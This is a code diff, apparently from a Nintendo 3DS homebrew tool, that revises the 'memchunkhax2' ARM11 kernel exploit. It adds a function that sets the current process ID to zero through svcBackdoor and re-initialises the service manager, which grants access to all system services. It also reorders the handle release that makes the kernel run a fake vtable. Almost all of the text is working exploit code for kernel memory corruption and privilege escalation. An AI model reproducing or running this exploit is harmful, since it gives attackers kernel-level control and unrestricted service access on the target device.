@@ -12,6 +12,28 @@
 	#define debugPrintError(...) 	({return -1;})
 #endif
 
+u8 isNew3DS = 0;
+
+// Exploits functions that will be used later
+int memchunkhax2();
+
+int suInit()
+{
+	APT_CheckNew3DS(&isNew3DS);
+	debugPrint("ARM11 Kernel Exploit\n");
+	
+	int res = memchunkhax2();
+	if(!res) 
+		debugPrint("Success!\n");
+	else
+		debugPrint("Failure! :(\n");
+	
+	return res;
+}
+
+/*
+	----- EXPLOITS DEDICATED AREA -----
+*/
 
 // 		MEMCHUNKHAX II AREA
 #define SLABHEAP_VIRTUAL	0xFFF70000
@@ -35,33 +57,38 @@ typedef struct {
 
 extern u32 __ctru_heap;
 extern u32 __ctru_heap_size;
-volatile u8 isNew3DS = 0;
 volatile u32 kernelHacked = -1;
 volatile u32 pidBackup = 0;
 
 static void patchPID()
 {
 	// Patch PID in order access all services
-	u32 kObjAddr;
-	if(isNew3DS) 	
-		kObjAddr = 0xBC;
-	else			
-		kObjAddr = 0xB4;
+	__asm__ volatile("cpsid aif");
 	u8* KProcess = (u8*) *((u32*)0xFFFF9004);
-	pidBackup = *((u32*)(KProcess + kObjAddr));
-	*((u32*)(KProcess + kObjAddr)) = 0;
+	pidBackup = *((u32*)(KProcess + (isNew3DS ? 0xBC : 0xB4)));
+	*((u32*)(KProcess + (isNew3DS ? 0xBC : 0xB4))) = 0;
 }
 
 static void unpatchPID()
 {
 	// Restore what we changed
-	u32 kObjAddr;
-	if(isNew3DS) 	
-		kObjAddr = 0xBC;
-	else			
-		kObjAddr = 0xB4;
+	__asm__ volatile("cpsid aif");
 	u8* KProcess = (u8*) *((u32*)0xFFFF9004);
-	*((u32*)(KProcess + kObjAddr)) = pidBackup;
+	*((u32*)(KProcess + (isNew3DS ? 0xBC : 0xB4))) = pidBackup;
+}
+
+void patchServiceAccess()
+{
+	// Set the current process id (PID) to 0
+	svcBackdoor(&patchPID);
+	
+	// Re-initialize srv connection. It will consider this the process with id 0
+	// so we will have access to any service
+	srvExit();
+	srvInit();
+	
+	// Once we tricked srv we can restore the real PID
+	svcBackdoor(&unpatchPID);
 }
 
 static void kernel_entry() {
@@ -85,7 +112,6 @@ static void kernel_entry() {
 	__asm ("mov r0, #0");
 	__asm ("mcr p15, 0, r0, c7, c5, 0");
 	__asm ("mcr p15, 0, r0, c7, c10, 0");
-	patchPID();
 	kernelHacked = 0;
 }
 
@@ -160,7 +186,7 @@ int memchunkhax2()
 	if(res != 0) debugPrintError("ERROR : Can't allocate pages.\n");
 	
 	isolatedPage = 0;
-
+	
     // Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
     // Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
     // Prev does not matter, as any verification happens prior to the overwrite.
@@ -197,11 +223,14 @@ int memchunkhax2()
 	// Restore the kernel memory backup first
 	memcpy((void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)), backup, PAGE_SIZE - (kObjAddr & 0xFFF));
 	
-	debugPrint("#6 : Setup fake vtable...\n");
+	debugPrint("#6 : Setup fake vtable and release object...\n");
 	//waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4); 
     *(void***) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4) = vtable;
 	
-	debugPrint("#7 : Clean memory and release kobject...\n");
+	// With this the kernel should run our code
+	if(kObjHandle != 0) svcCloseHandle(kObjHandle);
+	
+	debugPrint("#7 : Clean memory...\n");
 	if(data != NULL && data->result == 0)
         svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
 		
@@ -220,29 +249,13 @@ int memchunkhax2()
 	
     if(backup) free(backup);
     if(data) free(data);
-	if(kObjHandle != 0) svcCloseHandle(kObjHandle);
 	if(vtable) linearFree(vtable);
 	
-	srvExit();
 	while(kernelHacked != 0) svcSleepThread(1000000);
-	debugPrint("#8 : Grant access to all services and SVCs...\n");
-    srvInit();
+	debugPrint("#8 : Grant access to all services...\n");
+	patchServiceAccess();
 	svcSleepThread(0x4000000LL);
 	APT_SetAppCpuTimeLimit(80);
 	return 0;
 }
 //		END OF MEMCHUNKHAX II AREA
-
-int suInit()
-{
-	APT_CheckNew3DS(&isNew3DS);
-	debugPrint("ARM11 Kernel Exploit\n");
-	
-	int res = memchunkhax2();
-	if(!res) 
-		debugPrint("Success!\n");
-	else
-		debugPrint("Failure! :(\n");
-	
-	return res;
-}
